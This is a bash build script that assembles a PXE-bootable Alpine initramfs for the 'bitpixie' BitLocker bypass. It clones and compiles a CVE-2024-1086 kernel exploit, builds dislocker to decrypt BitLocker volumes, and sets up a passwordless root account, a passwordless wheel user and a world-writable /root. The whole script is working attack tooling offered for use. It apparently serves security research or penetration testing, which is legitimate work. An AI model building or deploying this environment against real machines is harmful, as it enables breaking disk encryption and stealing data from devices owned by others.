#!/usr/bin/env bash
#
# Create initramfs for bitpixie exploit
# Based on top of https://github.com/alpinelinux/alpine-make-rootfs
#

## Common functions
out() { printf "\n\033[32;1m[+] %s \033[0m\n" "$1"; }

if [ "$1" = "-d" ] || [ "$1" = "--debug" ]; then
    DEBUG="1"
elif [ -z "$1" ]; then
    DEBUG="0"
else
    printf 'ERROR: Unkown input.\n  Usage: %s [-d|--debug]\n' "$(basename $0)"
    exit 1
fi

SRC_ROOT="$PWD"
CACHE="$SRC_ROOT/.cache"
[ -d $CACHE ] || mkdir -p $CACHE # create .cache directory

out "Using $SRC_ROOT as root of operation."

## Download missing artifacts
bash -c "$SRC_ROOT/linux/download.sh $SRC_ROOT $CACHE"

# create temporary initramfs direcotry
INITRAMFS="$(mktemp -d)"
trap 'sudo rm -rf $INITRAMFS' EXIT

## Preprocessing
# Copy all relevant files

# kernel
mkdir -p $INITRAMFS/boot
cp $CACHE/vmlinuz* $INITRAMFS/boot
# copy kernel driver
cp -r $CACHE/lib $INITRAMFS
# additional pieces of rootfs files
cp -r $SRC_ROOT/linux/root/* $INITRAMFS
find $INITRAMFS -type f -name 'README.md' -delete

out "Populating temporary rootfs at $INITRAMFS..."

## Execute it and start the build process
sudo $CACHE/alpine-make-rootfs \
    --branch latest-stable \
    --packages 'alpine-base agetty eudev chntpw util-linux openssh doas' \
    --packages 'sgdisk ntfs-3g fuse-common' \
    --packages 'fuse mbedtls musl' \
    --packages 'vis' \
    --timezone 'Europe/Berlin' \
    --script-chroot "$INITRAMFS" - <<'SHELL'
        # Fail if an error occurs
        set -e

        # Generate modules.*.bin for modprobe
        depmod $(ls /boot/vmlinuz* |  cut -d "-" -f2-)

        # Add services for service manager.
        # See
        #  https://wiki.alpinelinux.org/wiki/OpenRC
        # for more information.
        #
        # A list of available services resides in $INITRAMFS/etc/init.d
        rc-update add dmesg sysinit

        rc-update add hwclock boot
        rc-update add modules boot
        rc-update add sysctl boot
        rc-update add hostname boot
        rc-update add bootmisc boot
        rc-update add syslog boot
        rc-update add klogd boot
        rc-update add networking boot
        rc-update add hwdrivers boot
        rc-update add sysfs boot
        rc-update add procfs boot

        rc-update add mount-ro shutdown
        rc-update add killprocs shutdown

        # Load also agetty.ttyS0 to see the kernel log during boot up in
        # combination with the flag `-append "console=ttyS0"`
        CONSOLE="ttyS0"
        ln -s /etc/init.d/agetty /etc/init.d/agetty.$CONSOLE
        rc-update add agetty.$CONSOLE default

        # Show debug infos
        set -x

        # save start path for later to return to
        ROOT="$PWD"

        # Prepare build environment
        build_packages="alpine-sdk" # Common development meta package
        build_packages="${build_packages} cmake fuse-dev mbedtls-dev" # dislocker
        apk add $build_packages

        # Build cve exploit
        cve="$(mktemp -d)"
        git clone --single-branch https://github.com/andigandhi/CVE-2024-1086_bitpixie.git $cve
        cd $cve
        # Use commit 30cccf935c2a ("removed unused functions and changed output
        # file") as HEAD
        git reset --hard 30cccf935c2a
        make CC=cc && cp ./exploit /usr/bin

        # Build dislocker
        bitlocker="$(mktemp -d)"
        git clone --single-branch https://github.com/Aorimn/dislocker.git $bitlocker
        cd $bitlocker
        # Use commit 3e7aea196eaa ("Merge pull request #317 from
        # JunielKatarn/macos") as HEAD
        git reset --hard 3e7aea196eaa
        cmake -S ./ && make && make install

        # Cleanup build environment
        apk del $build_packages

        ## Postprocessing
        cd $ROOT

        # Add new non-root user.
        NAME="bitpix"
        addgroup ${NAME}
        adduser -s /bin/sh -h /home/${NAME} -u 1000 -D -G ${NAME} ${NAME}
        addgroup bitpix wheel # add new user to group wheel

        chmod -R 777 /root
        chown root:root /etc/doas.conf

        # Delete password(s)
        passwd -d root
        passwd -d ${NAME}
SHELL

# Exit prematurely if alpine-make-rootfs fails
if [ "$?" = "1" ]; then
    if [ "$DEBUG" = "1" ]; then
        trap - EXIT
        out "Kept temporary rootfs at $INITRAMFS."
    fi
    exit 1
fi

if [ "$DEBUG" = "1" ]; then
    COMPRESS="gzip"
    FILE_EXTENSION="gz"
else
    # Use a compression algorithm to compress to the most possible (because the
    # initramfs needs to be loaded via PXE)
    COMPRESS="xz -z -C crc32 -9 --threads=0 -c -"
    FILE_EXTENSION="xz"
fi

OUTPUT="$SRC_ROOT/pxe-server/bitpixie-initramfs"
# Just for correct logging for user
RELATIVE_OUTPUT="$(realpath --relative-to $SRC_ROOT $OUTPUT)"

out "Creating initramfs $RELATIVE_OUTPUT from temporary rootfs at $INITRAMFS..."
# Note: Needs to be run as root because all files in the rootfs are chowned by root
(cd $INITRAMFS; sudo bash -c "find . | cpio -o -H newc | $COMPRESS") > $OUTPUT

out "Created initramfs $RELATIVE_OUTPUT with file extension ${FILE_EXTENSION} at $(dirname $OUTPUT)."

if [ "$DEBUG" = "1" ]; then
    # Deactivate deletion of INITRAMFS
    trap - EXIT
    out "Kept temporary rootfs at $INITRAMFS"
else
    out "Deleted $INITRAMFS."
fi
